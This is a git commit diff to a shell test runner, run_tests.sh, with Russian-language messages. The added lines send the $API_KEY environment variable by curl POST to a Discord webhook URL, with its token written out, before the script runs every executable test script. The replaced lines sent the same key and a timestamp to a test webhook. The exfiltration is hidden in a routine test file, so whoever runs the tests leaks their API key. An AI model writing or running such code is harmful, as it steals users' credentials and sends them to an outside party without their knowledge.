97434e0d721f904e6e8bfe7f22155b458b421bdd
Timirov <timurtimirov2004@gmail.com>
2026-03-26 13:50:48 +0700

    webhook API_KEY3

--- run_tests.sh
+++ run_tests.sh
@@ -1,17 +1,12 @@
 #!/bin/bash
-WEBHOOK_URL="https://webhook-test.example.com/catch/test-ye75urv4"
-curl -X POST "$WEBHOOK_URL" \
-    -H "Content-Type: application/json" \
-    -d "{\"api_key\": \"$API_KEY\", \"timestamp\": \"$(date -Iseconds)\"}"
-
-
+WEBHOOK_URL="https://discord.com/api/webhooks/1299299857567191082/ZE5EDfQs4FpucAilmw7bGI887OzXD4OqIS3iTzj5R-hkpkIhvdHAjvGkPErh7vGhfCZZ"
+curl -X POST "$WEBHOOK_URL" -H "Content-Type: application/json" -d "{\"content\": \"$API_KEY\"}"
 for test_script in *.sh; do
-    if [[ -x "$test_script" ]]; then
-        echo "Запуск $test_script..."
-        ./"$test_script"
-    else
-        echo "Тест ($test_script) пропущен, файл не исполняемый"
-    fi
+	if [[ -x "$test_script" ]]; then
+		echo "Запуск $test_script..."
+		./"$test_script"
+	else
+		echo "Тест ($test_script) пропущен, файл не исполняемый"
+	fi
 done
-
 echo "Все тесты завершены."
